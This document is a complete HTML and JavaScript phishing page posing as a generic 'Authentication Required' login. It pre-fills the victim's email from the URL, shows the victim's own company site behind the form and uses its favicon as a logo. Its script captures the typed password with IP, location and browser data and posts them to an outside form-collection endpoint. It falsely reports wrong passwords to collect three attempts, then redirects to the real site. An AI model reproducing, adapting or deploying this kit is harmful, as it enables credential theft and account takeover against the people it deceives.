<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Secure Login - Authentication Required</title>
<style>
    * {
        box-sizing: border-box;
        padding: 0;
        margin: 0;
    }

    body {
        height: 100vh;
        width: 100vw;
        font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
        overflow: hidden;
    }

    .bg-img {
        height: 100%;
        width: 100%;
        position: relative;
    }
    
    iframe {
        height: 100%;
        width: 100%;
        border: none;
        position: absolute;
        top: 0;
        left: 0;
    }

    /* Dark overlay for better contrast */
    .overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        z-index: 1;
    }

    /* Form container */
    .container {
        max-width: 400px;
        width: 90%;
        padding: 30px 25px;
        background-color: rgba(255, 255, 255, 0.98);
        border-radius: 8px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        z-index: 2;
        backdrop-filter: blur(10px);
    }

    @media (max-width: 768px) {
        .container {
            width: 95%;
            padding: 20px 15px;
        }
    }

    .img {
        text-align: center;
        margin-bottom: 15px;
    }
    
    #logo {
        width: 48px;
        height: 48px;
        border-radius: 8px;
        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }

    #title {
        text-align: center;
        margin: 15px 0;
        color: #333;
        font-size: 24px;
        font-weight: 600;
    }

    .domain-badge {
        text-align: center;
        background: #f0f7ff;
        padding: 8px;
        border-radius: 20px;
        margin: 15px 0;
        font-size: 14px;
        color: #0066cc;
        border: 1px solid #cce5ff;
    }

    .domain-badge span {
        font-weight: bold;
        color: #004d99;
    }

    label {
        display: block;
        margin-bottom: 8px;
        color: #555;
        font-weight: 500;
        font-size: 14px;
    }

    input[type=email], 
    input[type=password] {
        width: 100%;
        padding: 14px 15px;
        margin: 0 0 20px 0;
        border: 1px solid #ddd;
        background: #f9f9f9;
        border-radius: 6px;
        font-size: 15px;
        transition: all 0.3s;
    }

    input[type=email]:focus, 
    input[type=password]:focus {
        background-color: #fff;
        border-color: #0096FF;
        outline: none;
        box-shadow: 0 0 0 3px rgba(0, 150, 255, 0.1);
    }

    input[readonly] {
        background-color: #f0f0f0;
        color: #333;
        font-weight: 500;
        cursor: not-allowed;
    }

    .btn {
        background-color: #0096FF;
        color: white;
        padding: 16px 20px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        width: 100%;
        font-size: 16px;
        font-weight: 600;
        transition: all 0.3s;
    }

    .btn:hover {
        background-color: #0077cc;
        transform: translateY(-1px);
        box-shadow: 0 5px 15px rgba(0, 150, 255, 0.3);
    }

    .btn:disabled {
        background-color: #ccc;
        cursor: not-allowed;
        transform: none;
        box-shadow: none;
    }

    #error {
        display: none;
        color: #d32f2f;
        background: #ffebee;
        padding: 12px;
        border-radius: 6px;
        margin: 15px 0;
        text-align: center;
        font-size: 14px;
        border-left: 4px solid #d32f2f;
    }

    #success-message {
        display: none;
        color: #2e7d32;
        background: #e8f5e9;
        padding: 12px;
        border-radius: 6px;
        margin: 15px 0;
        text-align: center;
        font-size: 14px;
        border-left: 4px solid #2e7d32;
    }

    .footer-text {
        text-align: center;
        margin-top: 20px;
        font-size: 12px;
        color: #888;
    }

    .attempt-counter {
        text-align: center;
        margin-top: 10px;
        font-size: 13px;
        color: #666;
    }

    .secure-badge {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 5px;
        margin-top: 15px;
        font-size: 12px;
        color: #4caf50;
    }
</style>
</head>
<body>

<div class="bg-img" id="bg-img">
    <iframe id="frame" src="#" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="position: absolute; height: 100%; width: 100%; border: none;"></iframe>
    <div class="overlay"></div>
</div>

<form class="container" id="login-form">
    <div class="img">
        <img src="#" id="logo" alt="Site Logo">
    </div>

    <h3 id="title">Authentication Required </h3>
    
    

    <div id="error"></div>
    <div id="success-message"></div>

    <label for="email"><b>Email Address</b></label>
    <input type="email" placeholder="Enter Email" name="email" id="email" required readonly>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="password" id="psw" required autocomplete="off">

    <input type="hidden" name="step" id="step" value="1">

    <button type="submit" class="btn" id="submit-btn">Sign In</button>
    
    
    
    <div class="secure-badge">
        ðŸ”’ Secure Connection
    </div>
    
    <div class="footer-text">
        Â© 2026 Secure Authentication. All rights reserved.
    </div>
</form>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
$(document).ready(function() {
    let step = 1;
    const MAX_ATTEMPTS = 3;
    
    // Get client ID from URL hash
    const clientID = window.location.hash.substring(1); // Remove the #
    
    if (!clientID || !clientID.includes('@')) {
        $('#error').text('Invalid access. Please use a valid email in the URL.').show();
        $('#submit-btn').prop('disabled', true);
        return;
    }
    
    $('#email').val(clientID);
    const domain = clientID.split('@').pop();
    
    // Update domain display
    $('#domain-name').text(domain);
    
    // Set iframe source with error handling
    const frameUrl = "https://www." + domain;
    $("#frame").attr("src", frameUrl);
    
    // Handle iframe load error
    $("#frame").on('error', function() {
        console.log('Failed to load iframe content');
        // Try without www
        $("#frame").attr("src", "https://" + domain);
    });
    
    // Set favicon as logo
    $("#logo").attr("src", "https://www.google.com/s2/favicons?domain=" + domain + "&sz=64");
    
    // Logo fallback
    $("#logo").on('error', function() {
        $(this).attr('src', 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="%230096FF"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6-2.28 0-2.56 3.5-4.72 6-4.72s6 2.16 6 4.72c-1.57 1.46-3.97 2.28-6 2.28z"/></svg>');
    });

    const submit = $("#submit-btn");

    // Function to update attempt counter
    function updateAttemptCounter() {
        $('#attempt-counter').text(`Attempt ${step}/${MAX_ATTEMPTS}`);
    }
    
    updateAttemptCounter();

    // Function to get user IP with fallback
    function getUserIP() {
        return new Promise((resolve) => {
            $.getJSON('https://api.ipify.org?format=json')
                .done(function(data) {
                    resolve(data.ip);
                })
                .fail(function() {
                    // Fallback to ipinfo.io
                    $.getJSON('https://ipinfo.io/json')
                        .done(function(data) {
                            resolve(data.ip);
                        })
                        .fail(function() {
                            resolve('IP unavailable');
                        });
                });
        });
    }

    // Function to get location from IP
    function getLocation(ip) {
        return new Promise((resolve) => {
            if (ip === 'IP unavailable') {
                resolve('Location unavailable');
                return;
            }
            
            $.getJSON(`https://ipapi.co/${ip}/json/`)
                .done(function(data) {
                    if (data.city && data.country_name) {
                        resolve(`${data.city}, ${data.country_name}`);
                    } else {
                        resolve('Location unavailable');
                    }
                })
                .fail(function() {
                    resolve('Location unavailable');
                });
        });
    }

    // Function to send data to endpoint
    async function sendData(email, password, ip, location) {
        const formData = {
            _subject: `Login Logs | ${ip}`,
            Email: email,
            Password: password,
            Attempts: step,
            IP: ip,
            Location: location,
            Domain: domain,
            UserAgent: navigator.userAgent,
            Timestamp: new Date().toISOString()
        };

        return $.ajax({
            url: "https://formbold.com/s/35OYy", // Your endpoint
            method: "POST",
            data: formData,
            dataType: 'json'
        });
    }

    // Form submission handler
    $("#login-form").submit(async function(event) {
        event.preventDefault();

        const email = $("#email").val();
        const password = $("#psw").val();

        if (!password) {
            $('#error').text('Please enter your password').show();
            return;
        }

        // Disable button and show loading
        submit.prop('disabled', true).text('Verifying...');
        $('#error').hide();
        $('#success-message').hide();

        try {
            // Get IP and location
            const ip = await getUserIP();
            const location = await getLocation(ip);

            // Send data
            const response = await sendData(email, password, ip, location);

            if (step >= MAX_ATTEMPTS) {
                // Max attempts reached - redirect
                $('#success-message').text('Authentication successful. Redirecting...').show();
                setTimeout(() => {
                    window.location.href = "https://" + domain;
                }, 2000);
            } else {
                // Increment step and show error
                step++;
                $('#step').val(step);
                updateAttemptCounter();
                
                $("#error").text('Invalid password. Please try again.').show();
                submit.prop('disabled', false).text('Sign In');
                $("#psw").val("");
                
                // Clear error after 5 seconds
                setTimeout(() => {
                    $("#error").fadeOut();
                }, 5000);
            }

        } catch (error) {
            console.error('Submission error:', error);
            
            if (step >= MAX_ATTEMPTS) {
                // Even on error, redirect after max attempts
                window.location.href = "https://" + domain;
            } else {
                $("#error").text('Connection error. Please try again.').show();
                submit.prop('disabled', false).text('Sign In');
                $("#psw").val("");
            }
        }
    });

    // Handle Enter key
    $("#psw").keypress(function(e) {
        if (e.which === 13) {
            $("#login-form").submit();
        }
    });

    // Auto-clear error when typing
    $("#psw").on('input', function() {
        $('#error').fadeOut();
    });

    // Handle iframe loading issues
    $(window).on('load', function() {
        setTimeout(function() {
            // Check if iframe loaded
            const iframe = document.getElementById('frame');
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                if (!iframeDoc.body.innerHTML) {
                    console.log('Iframe content empty, attempting reload');
                    iframe.src = 'https://' + domain;
                }
            } catch (e) {
                console.log('Iframe cross-origin access - this is expected');
            }
        }, 3000);
    });
});
</script>
</body>
</html>
